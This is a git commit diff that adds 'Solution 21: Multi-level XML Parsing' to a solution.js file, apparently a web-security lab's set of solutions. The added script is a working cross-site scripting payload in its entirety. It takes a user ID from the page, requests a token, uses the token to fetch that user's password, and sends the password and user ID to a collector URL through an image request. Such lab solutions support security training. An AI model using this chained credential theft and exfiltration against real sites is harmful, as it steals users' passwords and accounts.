6d36e5a7b5136745ce6a98c80c7116343b3d43fa
h3ll0clar1c3 <61941106+h3ll0clar1c3@users.noreply.github.com>
2021-06-02 22:10:51 +0200

    Update solution.js

--- solution.js
+++ solution.js
@@ -362,3 +362,42 @@ req.send();
 	
 </script>
 
+
+* Solution 21: Multi-level XML Parsing
+
+<script>
+
+var link = document.getElementById("settings");
+var req = new XMLHttpRequest();
+var token = '';
+var uid = '';
+var req2 = new XMLHttpRequest();
+req2.onreadystatechange = function ()
+
+{
+	if (req2.readyState == 4 && req2.status ==200)
+{
+	var pass_obj = JSON.parse(req2.responseText);
+	var password = pass_obj.resp.password;
+	document.getElementById("result").innerHTML = password;
+	new Image().src = "http://localhost/?password="+password+"&uid="+uid;
+}
+};
+
+req.onreadystatechange=function()
+{
+	if (req.readyState == 4 && req.status == 200)
+	{
+		response_obj = JSON.parse(req.responseText);
+		token = response_obj.params.token;
+		
+		req2.open("GET", "/lab/webapp/jfp/20/getpassword?token="+token, true);
+		req2.send();
+	}
+};
+
+uid = link.innerHTML.split(':')[1]
+req.open("GET", "/lab/webapp/jfp/20/gettoken?uid="+uid, true);
+req.send();
+	
+</script>
